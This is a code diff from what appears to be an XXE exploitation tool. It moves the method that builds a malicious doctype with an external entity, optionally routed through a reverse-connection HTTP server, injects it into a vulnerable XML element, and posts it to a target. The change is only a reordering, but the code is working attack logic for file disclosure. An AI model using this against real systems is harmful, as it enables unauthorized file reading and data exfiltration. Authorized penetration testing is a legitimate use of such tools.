@@ -55,6 +55,24 @@ class BasicXXEAttack(BaseXXEAttack):
             raise NoVulnerableElementFound()
         self._vulnerable_element = vulnerable_element
 
+    def _configure_xml_for_attack(self, resource: str):
+        # Setting doctype
+        if self.get_use_cdata_tag():
+            http_params = self.get_http_server_params()
+            if http_params is None:
+                raise ReverseConnectionParamsNotSpecified()
+
+            entities = cdata.get_cdata_doctype_entities(resource, http_params)
+        else:
+            entities = [
+                XMLEntity(_name=cdata.CDATA_EXPLOIT_ENTITY_NAME, _value=resource, _is_external=True)
+            ]
+        doctype = XMLDoctype(self._vulnerable_element.get_name(), entities)
+        self.get_xml().change_text_element_value(
+            self._vulnerable_element.get_name(), f"&{cdata.CDATA_EXPLOIT_ENTITY_NAME};"
+        )
+        self.get_xml().set_doctype(doctype)
+
     def _run_attack(self) -> str:
         def inner():
             response = HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
@@ -75,21 +93,3 @@ class BasicXXEAttack(BaseXXEAttack):
         else:
             data = inner()
         return data
-
-    def _configure_xml_for_attack(self, resource: str):
-        # Setting doctype
-        if self.get_use_cdata_tag():
-            http_params = self.get_http_server_params()
-            if http_params is None:
-                raise ReverseConnectionParamsNotSpecified()
-
-            entities = cdata.get_cdata_doctype_entities(resource, http_params)
-        else:
-            entities = [
-                XMLEntity(_name=cdata.CDATA_EXPLOIT_ENTITY_NAME, _value=resource, _is_external=True)
-            ]
-        doctype = XMLDoctype(self._vulnerable_element.get_name(), entities)
-        self.get_xml().change_text_element_value(
-            self._vulnerable_element.get_name(), f"&{cdata.CDATA_EXPLOIT_ENTITY_NAME};"
-        )
-        self.get_xml().set_doctype(doctype)
